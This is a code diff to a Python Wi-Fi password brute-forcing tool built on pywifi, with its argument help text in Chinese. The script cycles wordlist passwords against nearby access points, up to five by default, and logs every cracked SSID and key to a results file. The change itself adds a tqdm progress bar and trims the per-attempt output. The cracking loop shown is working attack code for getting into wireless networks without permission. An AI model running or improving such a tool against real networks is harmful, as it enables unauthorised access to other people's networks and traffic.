@@ -1,9 +1,8 @@
 import os
-import random
-import math
 
 import pywifi
 from pywifi import const  # 引用一些定义
+from tqdm import tqdm
 
 from _util import get_aps, crack_ap, classify_aps, sample_passwords
 
@@ -49,19 +48,14 @@ def main(password_file, count=5, result_file='results.txt', stype=1):
 
         profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型
 
-        for key in sample_passwords(passwords, stype):
-            print('[+]使用密码 %s 破解 %s' % (key, ssid))
-
+        for key in tqdm(sample_passwords(passwords, stype), desc='Passwords'):
             profile.key = key
-
             if crack_ap(iface, profile):
                 cracked_table[profile.ssid] = key
                 with open(result_file, 'a') as f:
                     f.write('%s : %s\n' % (ssid, key))
-                print('[-]使用密码 %s 破解 %s成功' % (key, ssid))
+                print('[*]使用密码 %s 破解 %s成功' % (key, ssid))
                 break
-            else:
-                print('[-]使用密码 %s 破解 %s失败' % (key, ssid))
 
         print('[-]结束破解SSID:', profile.ssid)
 
@@ -74,11 +68,12 @@ def __main__():
 
     parser = argparse.ArgumentParser(description='暴力破解信号强度考前的热点')
     parser.add_argument('password_file', type=str, help='密码本文件')
-    parser.add_argument('-c', '--count', type=int, default=5, help='所要破解的热点个数，默认为破解5个')
+    parser.add_argument('-c', '--count', type=int,
+                        default=5, help='所要破解的热点个数，默认为破解5个')
     parser.add_argument('--result_file', type=str,
                         default='results.txt', help='保存所有热点密码结果文件')
     parser.add_argument('-s', '--stype', type=int, default=1,
-                        help=sample_passwords.__doc__+"，默认为1")
+                        help=sample_passwords.__doc__+'，默认为1')
     args = parser.parse_args()
 
     main(args.password_file, args.count, args.result_file, args.stype)
